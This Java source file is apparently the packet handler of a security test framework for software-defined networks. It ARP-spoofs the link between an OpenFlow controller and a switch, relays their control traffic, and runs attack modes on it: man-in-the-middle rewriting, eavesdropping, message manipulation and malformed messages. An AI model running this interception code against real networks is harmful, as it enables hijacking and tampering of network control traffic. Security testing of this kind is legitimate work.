package nss.delta.channelagent.pkthandler;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.projectfloodlight.openflow.exceptions.OFParseError;
import org.projectfloodlight.openflow.protocol.OFActionType;
import org.projectfloodlight.openflow.protocol.OFFactories;
import org.projectfloodlight.openflow.protocol.OFFactory;
import org.projectfloodlight.openflow.protocol.OFFlowAdd;
import org.projectfloodlight.openflow.protocol.OFFlowMod;
import org.projectfloodlight.openflow.protocol.OFFlowMod.Builder;
import org.projectfloodlight.openflow.protocol.OFFlowModCommand;
import org.projectfloodlight.openflow.protocol.OFMessage;
import org.projectfloodlight.openflow.protocol.OFMessageReader;
import org.projectfloodlight.openflow.protocol.OFPacketOut;
import org.projectfloodlight.openflow.protocol.OFType;
import org.projectfloodlight.openflow.protocol.OFVersion;
import org.projectfloodlight.openflow.protocol.action.OFAction;
import org.projectfloodlight.openflow.protocol.action.OFActionOutput;
import org.projectfloodlight.openflow.types.OFPort;
import org.projectfloodlight.openflow.types.U16;

import jpcap.JpcapCaptor;
import jpcap.JpcapWriter;
//import java.lang.UnsupportedOperationException;
import jpcap.NetworkInterface;
import jpcap.NetworkInterfaceAddress;
import jpcap.PacketReceiver;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
//import jpcap.packet.TCPPacket;
//import jpcap.packet.UDPPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import nss.delta.channelagent.core.Utils;
import nss.delta.channelagent.networknode.NetworkInfo;
import nss.delta.channelagent.testcase.TestAdvancedSet;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.PooledByteBufAllocator;
import io.netty.buffer.Unpooled;

public class PktHandler {
	public static final int MINIMUM_LENGTH = 8;

	public static final int EMPTY = 0;
	public static final int MITM = 1;
	public static final int EVAESDROP = 2;
	public static final int CONTROLMESSAGEMANIPULATION = 3;
	public static final int MALFORMEDCONTROLMESSAGE = 4;
	public static final int SYMFUZZ = 5;
	public static final int ASYFUZZ = 6;

	public static final int TEST = -1;

	private static HashMap<String, String> ip_mac_list;
	private static NetworkInterface device;
	private static ArrayList<String> ips_to_explore;

	// used to filter packets for and from the attacker
	private static String localIp;

	// victim A, B
	private static String controllerIP;
	private static String switchIP;

	private Listener traffic_listener;
	private Sender traffic_sender;

	private PacketReceiver middle_handler;
	private String output;
	private NetworkInfo nodes;
	private ARPSpoof spoof;

	// flags for distinguish the kind of attacks
	private int typeOfAttacks;
	private String ofPort;
	private byte ofversion;

	protected TestAdvancedSet testAdvanced;

	public PktHandler(NetworkInterface mydevice, String targets, byte OFversion, String port) {
		middle_handler = new middle_handler();
		ips_to_explore = new ArrayList<String>();
		nodes = new NetworkInfo();

		ofversion = OFversion;
		device = mydevice;
		ofPort = port;
		// set IP list
		this.setIpsToExplore(targets);

		// set MAC list
		ip_mac_list = new HashMap<String, String>();
		HostDiscover hosty = new HostDiscover(device, ips_to_explore);
		hosty.discover();
		ip_mac_list.putAll(hosty.getHosts());
		ArrayList<String> online_ips = new ArrayList<String>(ip_mac_list.keySet());

		// IP setting
		controllerIP = online_ips.get(0);
		switchIP = online_ips.get(1);
		localIp = Utils.__get_inet4(device).address.toString().split("/")[1];

		// OF Test setting
		OFFactory factory = null;
		if (OFversion == 0x01)
			factory = OFFactories.getFactory(OFVersion.OF_10);
		else if (OFversion == 0x04)
			factory = OFFactories.getFactory(OFVersion.OF_13);

		if (factory != null)
			testAdvanced = new TestAdvancedSet(factory, factory.getReader(), this.ofversion);

		try {
			this.traffic_listener = new Listener(device, this.middle_handler);
			this.traffic_listener.setFilter("port " + this.ofPort, true);
			this.traffic_listener.start();

			this.traffic_sender = new Sender(device);
			// this.captor = JpcapCaptor.openDevice(device, 65535, false, 20);
			//
			// // open a file to save captured packets
			// writer = JpcapWriter.openDumpFile(captor, this.output);

		} catch (IOException e) {
			e.printStackTrace();
		}

		// ARPSpoofing ready
		spoof = new ARPSpoof(device);
		spoof.setMacList(ip_mac_list);
		spoof.setIPList(ips_to_explore);
		spoof.setSender(this.traffic_sender);

		typeOfAttacks = this.MITM;
	}

	public void testfunc() {

	}

	public String printNetwrokNodes(String result) {
		return nodes.toPrintNodes(result, 0);
	}

	public void setIpsToExplore(String ips_temp) {
		if (ips_temp == null)
			return;
		String[] ips = ips_temp.split(",");
		for (int i = 0; i < ips.length; i++) {
			try {
				InetAddress.getByName(ips[i]);
				ips_to_explore.add(ips[i]);
			} catch (Exception e) {
				System.err.println("WARNING: " + ips[i] + " is not a valid ip address");
				// e.printStackTrace();
			}
		}
	}

	public void startARPSpoofing() {
		this.spoof.setARPspoof(true);
		this.spoof.start();
	}

	public void setARPspoof(boolean value) {
		this.spoof.setARPspoof(value);
	}

	public String getOutput() {
		return this.output;
	}

	public int getTypeOfAttacks() {
		return typeOfAttacks;
	}

	public void setTypeOfAttacks(int typeOfAttacks) {
		this.typeOfAttacks = typeOfAttacks;
	}

	class middle_handler implements PacketReceiver {
		private String dst_ip;
		private String src_ip;

		private boolean isTested = false;
		Map<Long, TCPBodyData> tcpBodys = new HashMap<Long, TCPBodyData>();

		// for fragmented tcp data
		private class TCPBodyData {

			byte[] bytes = null;

			public TCPBodyData(byte[] bytes) {
				this.bytes = bytes;
			}

			public void addBytes(byte[] bytes) {
				try {
					ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
					outputStream.write(this.bytes);
					outputStream.write(bytes);
					this.bytes = outputStream.toByteArray();
				} catch (IOException e) {
					e.printStackTrace();
				}

			}

			public byte[] getBytes() {
				return bytes;
			}
		}

		private byte[] addBodyData(TCPPacket packet) {
			TCPBodyData tcpBodyData;
			Long ack = new Long(packet.ack_num);
			if (tcpBodys.containsKey(ack)) {
				tcpBodyData = tcpBodys.get(ack);
				tcpBodyData.addBytes(packet.data);
			} else {
				tcpBodyData = new TCPBodyData(packet.data);
				tcpBodys.put(ack, tcpBodyData);
			}

			if (packet.psh) {
				tcpBodys.remove(ack);
			}

			return tcpBodyData.getBytes();
		}

		public void receivePacket(Packet p_temp) {
			EthernetPacket p_eth = (EthernetPacket) p_temp.datalink;

			// check if the packet is mine just return do not send it again
			String mine_mac = Utils.decalculate_mac(device.mac_address);
			String incoming_src_mac = Utils.decalculate_mac(p_eth.src_mac);

			IPPacket p = ((IPPacket) p_temp);
			this.dst_ip = p.dst_ip.toString().split("/")[1];
			this.src_ip = p.src_ip.toString().split("/")[1];

			// ignore channel-agent packets
			if (this.dst_ip.equals(localIp) || this.src_ip.equals(localIp) || mine_mac.equals(incoming_src_mac)) {
				return;
			} else if (p_temp.data.length < 8) {
				if (this.src_ip.equals(controllerIP) && this.dst_ip.equals(switchIP)) {
					traffic_sender.send(spoofPacket(p_temp, switchIP));
				} else if (this.src_ip.equals(switchIP) && this.dst_ip.equals(controllerIP)) {
					traffic_sender.send(spoofPacket(p_temp, controllerIP));
				}
				return;
			}

			if (typeOfAttacks == EVAESDROP) {
				if (p_temp.data.length > 8) {
					try {
						testAdvanced.testEvaseDrop(nodes, p_temp);
					} catch (OFParseError e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			} else if (typeOfAttacks == MITM) {
				ByteBuf newBuf = null;
				if (p_temp.data.length > 8) {
					try {
						newBuf = testAdvanced.testMITM(p_temp);
					} catch (OFParseError e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}

				if (newBuf != null) {
					byte[] bytes;
					int length = newBuf.readableBytes();

					if (newBuf.hasArray()) {
						bytes = newBuf.array();
					} else {
						bytes = new byte[length];
						newBuf.getBytes(newBuf.readerIndex(), bytes);
					}

					// replace packet data
					newBuf.clear();
					p_temp.data = bytes;
				}

			} else if (typeOfAttacks == CONTROLMESSAGEMANIPULATION) {
				System.out.println("\n[ATTACK] Control Message Manipulation");
				/* Modify a Packet Here */
				if (this.dst_ip.equals(controllerIP)) {
					(p.data)[2] = 0x77;
					(p.data)[3] = 0x77;
				}
			} else if (typeOfAttacks == MALFORMEDCONTROLMESSAGE) {
				System.out.println("\n[ATTACK] Malformed Control Message");
				/* Modify a Packet Here */
				if (this.dst_ip.equals(switchIP)) {
					// if ( (p.data)[1] != 0x0a ) {
					(p.data)[2] = 0x00;
					(p.data)[3] = 0x01;
					// }
				}
			}

			/* send Pkt */
			if (this.src_ip.equals(switchIP) && this.dst_ip.equals(controllerIP)) {
				traffic_sender.send(spoofPacket(p_temp, controllerIP));
			} else if (this.src_ip.equals(controllerIP) && this.dst_ip.equals(switchIP)) {
				traffic_sender.send(spoofPacket(p_temp, switchIP));
			}

			return;
		}

		private Packet spoofPacket(Packet p, String victim) {
			EthernetPacket p_eth = (EthernetPacket) p.datalink;
			EthernetPacket ether = new EthernetPacket();
			ether.frametype = p_eth.frametype;

			ether.src_mac = device.mac_address;// p_eth.src_mac;
			// only difference now is that for dst mac now is the official
			ether.dst_mac = Utils.calculate_mac(ip_mac_list.get(victim));

			p.datalink = ether;

			return p;
		}
	}
}
